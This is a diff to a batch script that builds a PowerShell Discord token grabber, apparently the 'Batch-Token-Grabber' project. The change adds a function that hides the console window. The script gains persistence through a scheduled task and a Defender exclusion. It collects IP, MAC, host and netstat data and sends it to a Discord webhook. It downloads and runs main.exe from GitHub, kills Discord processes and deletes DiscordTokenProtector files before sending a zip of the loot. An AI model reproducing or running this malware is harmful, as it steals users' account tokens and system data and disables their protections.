@@ -3,8 +3,22 @@
 echo function CHECK_IF_ADMIN { > powershell.ps1
 echo     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell.ps1
 echo } >> powershell.ps1
-echo. >> powershell.ps1
+echo function Hide-Console >> powershell.ps1
+echo { >> powershell.ps1
+echo     if (-not ("Console.Window" -as [type])) {  >> powershell.ps1
+echo         Add-Type -Name Window -Namespace Console -MemberDefinition ' >> powershell.ps1
+echo         [DllImport("Kernel32.dll")] >> powershell.ps1
+echo         public static extern IntPtr GetConsoleWindow(); >> powershell.ps1
+echo         [DllImport("user32.dll")] >> powershell.ps1
+echo         public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow); >> powershell.ps1
+echo         ' >> powershell.ps1
+echo     } >> powershell.ps1
+echo     $consolePtr = [Console.Window]::GetConsoleWindow() >> powershell.ps1
+echo     #0 hide >> powershell.ps1
+echo     $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell.ps1
+echo } >> powershell.ps1
 echo function TASKS { >> powershell.ps1
+echo     Hide-Console >> powershell.ps1
 echo     $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell.ps1
 echo     if ($test_KDOT -eq $false) { >> powershell.ps1
 echo         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell.ps1
@@ -23,7 +37,6 @@ echo         Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action 
 echo     } >> powershell.ps1
 echo     Grub >> powershell.ps1
 echo } >> powershell.ps1
-echo. >> powershell.ps1
 echo function Grub { >> powershell.ps1
 echo     $webhook = "YOUR_WEBHOOK_HERE" >> powershell.ps1
 echo     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell.ps1
@@ -37,7 +50,6 @@ echo     $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell.ps1
 echo     $username = $env:USERNAME >> powershell.ps1
 echo     $hostname = $env:COMPUTERNAME >> powershell.ps1
 echo     $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell.ps1
-echo. >> powershell.ps1
 echo     $embed_and_body = @{ >> powershell.ps1
 echo         "username" = "KDOT" >> powershell.ps1
 echo         "content" = "@everyone" >> powershell.ps1
@@ -83,37 +95,29 @@ echo                 ) >> powershell.ps1
 echo             } >> powershell.ps1
 echo         ) >> powershell.ps1
 echo     } >> powershell.ps1
-echo. >> powershell.ps1
 echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
 echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell.ps1
-echo. >> powershell.ps1
 echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
 echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
-echo. >> powershell.ps1
 echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
 echo     taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell.ps1
-echo. >> powershell.ps1
 echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
 echo     $proc.WaitForExit() >> powershell.ps1
-echo. >> powershell.ps1
 echo     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell.ps1
 echo     if ($token_prot -eq $true) { >> powershell.ps1
 echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell.ps1
 echo     } >> powershell.ps1
-echo. >> powershell.ps1
 echo     $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell.ps1
 echo     if ($secure_dat -eq $true) { >> powershell.ps1
 echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell.ps1
 echo     } >> powershell.ps1
-echo. >> powershell.ps1
 echo     $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell.ps1
 echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
 echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
 echo     } >> powershell.ps1
 echo     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure" >> powershell.ps1
-echo. >> powershell.ps1
 echo     $lol = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
 echo     Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell.ps1
 echo     Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell.ps1
@@ -133,9 +137,7 @@ echo     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"conte
 echo     Remove-Item "$lol\KDOT.zip" -Force >> powershell.ps1
 echo     Remove-Item "$lol\KDOT" -Recurse -Force >> powershell.ps1
 echo     Remove-Item "$lol\main.exe" -Force >> powershell.ps1
-echo. >> powershell.ps1
 echo } >> powershell.ps1
-echo. >> powershell.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell.ps1
 echo     TASKS >> powershell.ps1
 echo     #pause >> powershell.ps1
